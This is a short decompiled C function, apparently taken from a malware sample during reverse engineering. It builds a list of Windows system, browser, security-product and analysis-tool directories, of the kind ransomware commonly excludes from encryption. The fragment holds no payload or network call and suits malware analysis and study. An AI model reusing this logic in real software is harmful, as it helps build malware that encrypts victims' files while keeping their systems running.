int PrepareDirectoryPaths()
{
  char *v1; // [esp+0h] [ebp-8h]
  char *v2; // [esp+4h] [ebp-4h]

  v2 = (char *)ImpLocalAlloc(0x28u);
  if ( v2 )
    v1 = PtrRefObj(v2);
  else
    v1 = 0;
  dword_44A354 = (int)v1;
  ExpandEnvironmentString(L"%windir%");
  sub_42EFD0(L":\\$RECYCLE.BIN\\");
  sub_42EFD0(L"\\windows\\system32\\");
  sub_42EFD0(L"\\windows\\syswow64\\");
  sub_42EFD0(L"\\windows\\system\\");
  sub_42EFD0(L"\\windows\\winsxs\\");
  sub_42EFD0(L"\\System\\msadc\\");
  sub_42EFD0(L"\\Common Files\\");
  sub_42EFD0(L"\\WindowsPowerShell\\");
  sub_42EFD0(L"\\Program Files\\Internet Explorer\\");
  sub_42EFD0(L"\\Program Files\\Microsoft Games\\");
  sub_42EFD0(L"\\all users\\microsoft\\");
  sub_42EFD0(L"\\inetpub\\logs\\");
  sub_42EFD0(L":\\boot\\");
  sub_42EFD0(L":\\system volume information\\");
  sub_42EFD0(L":\\drivers\\");
  sub_42EFD0(L":\\wsus\\");
  sub_42EFD0(L"\\cache\\");
  sub_42EFD0(L"\\cache2\\");
  sub_42EFD0(L"\\far manager\\");
  sub_42EFD0(L"\\ida 7.0\\");
  sub_42EFD0(L"\\ida 6.8\\");
  sub_42EFD0(&off_440B48);
  sub_42EFD0(L"\\Temporary Internet Files\\");
  sub_42EFD0(L"\\Temp\\");
  sub_42EFD0(L"$windows.~bt");
  sub_42EFD0(L"$windows.~ws");
  sub_42EFD0(L"\\google\\");
  sub_42EFD0(L"\\mozilla\\");
  sub_42EFD0(L"\\tor browser\\");
  sub_42EFD0(L"\\windows.old\\");
  sub_42EFD0(L"\\intel\\");
  sub_42EFD0(L"\\msocache\\");
  sub_42EFD0(L"\\perflogs\\");
  sub_42EFD0(L"\\ProgramData\\Microsoft\\");
  sub_42EFD0(L"\\Application Data\\Microsoft\\");
  sub_42EFD0(L"\\All Users\\Microsoft\\");
  sub_42EFD0(L"\\Roaming\\Microsoft\\");
  sub_42EFD0(L"\\Local\\Microsoft\\");
  sub_42EFD0(L"\\Local Settings\\Microsoft\\");
  sub_42EFD0(L"\\LocalLow\\Microsoft\\");
  sub_42EFD0(L"\\Common\\Microsoft\\");
  sub_42EFD0(L"\\Sophos\\");
  sub_42EFD0(L"\\Symantec\\");
  sub_42EFD0(L"\\Leaked\\");
  return sub_42EFD0(L"\\Mozilla Firefox\\");
}